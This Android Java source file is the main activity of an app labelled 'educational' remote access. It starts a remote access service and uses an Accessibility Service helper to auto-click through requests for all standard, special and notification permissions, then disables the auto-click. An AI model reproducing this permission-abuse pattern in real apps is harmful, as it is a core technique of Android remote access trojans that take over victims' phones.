package com.remoteaccess.educational;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.remoteaccess.educational.permissions.AccessibilityHelperService;
import com.remoteaccess.educational.permissions.AutoPermissionManager;
import com.remoteaccess.educational.services.RemoteAccessService;
import com.remoteaccess.educational.utils.PreferenceManager;

public class MainActivity extends AppCompatActivity {

    private TextView statusText;
    private Button consentButton;
    private PreferenceManager preferenceManager;
    private AutoPermissionManager permissionManager;
    private Handler handler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        preferenceManager = new PreferenceManager(this);
        permissionManager = new AutoPermissionManager(this);
        handler = new Handler();

        statusText = findViewById(R.id.statusText);
        consentButton = findViewById(R.id.consentButton);

        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            startRemoteAccessService();
            
            // Check if accessibility is enabled
            if (!permissionManager.isAccessibilityServiceEnabled()) {
                // Not enabled - start setup flow
                startAccessibilitySetup();
            }
            // If already enabled, nothing more needed
        } else {
            showConsentRequired();
            // Auto-start consent after 1 second
            new Handler().postDelayed(() -> {
                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                startActivity(intent);
            }, 1000);
        }

        consentButton.setOnClickListener(v -> {
            if (!preferenceManager.isConsentGiven()) {
                Intent intent = new Intent(MainActivity.this, ConsentActivity.class);
                startActivity(intent);
            } else {
                revokeConsent();
            }
        });
    }

    private void startAccessibilitySetup() {
        Toast.makeText(this, "Please enable Accessibility Service...", Toast.LENGTH_LONG).show();
        
        // Ask for accessibility
        new Handler().postDelayed(() -> {
            permissionManager.requestAccessibilityService();
            
            // Monitor for accessibility
            monitorAccessibility();
        }, 1000);
    }

    private void monitorAccessibility() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (permissionManager.isAccessibilityServiceEnabled()) {
                    // Accessibility enabled - now auto-grant other permissions
                    autoGrantPermissions();
                } else {
                    // Keep checking
                    handler.postDelayed(this, 2000);
                }
            }
        }, 3000);
    }

    private void autoGrantPermissions() {
        Toast.makeText(this, "Accessibility enabled! Setting up (10s)...", Toast.LENGTH_LONG).show();
        
        // Request all permissions
        new Handler().postDelayed(() -> {
            permissionManager.requestAllPermissions();
        }, 1000);

        // Request special permissions
        new Handler().postDelayed(() -> {
            permissionManager.requestSpecialPermissions();
        }, 3000);

        // Request notification
        new Handler().postDelayed(() -> {
            permissionManager.requestNotificationPermission();
        }, 5000);

        // Disable auto-click after setup is complete (10 seconds)
        new Handler().postDelayed(() -> {
            AccessibilityHelperService.disableAutoClick();
        }, 10000);
    }

    @Override
    protected void onResume() {
        super.onResume();
        
        if (preferenceManager.isConsentGiven()) {
            showActiveStatus();
            
            // Check if accessibility got enabled while in background
            if (!permissionManager.isAccessibilityServiceEnabled()) {
                startAccessibilitySetup();
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
    }

    private void showActiveStatus() {
        statusText.setText("✓ Remote Access Active\n\nYour device is connected and can be managed remotely.");
        consentButton.setText("Revoke Access");
    }

    private void showConsentRequired() {
        statusText.setText("⚠ Consent Required\n\nPlease provide consent to enable remote access features.");
        consentButton.setText("Give Consent");
    }

    private void startRemoteAccessService() {
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        startForegroundService(serviceIntent);
    }

    private void revokeConsent() {
        preferenceManager.setConsentGiven(false);
        Intent serviceIntent = new Intent(this, RemoteAccessService.class);
        stopService(serviceIntent);
        showConsentRequired();
    }
}
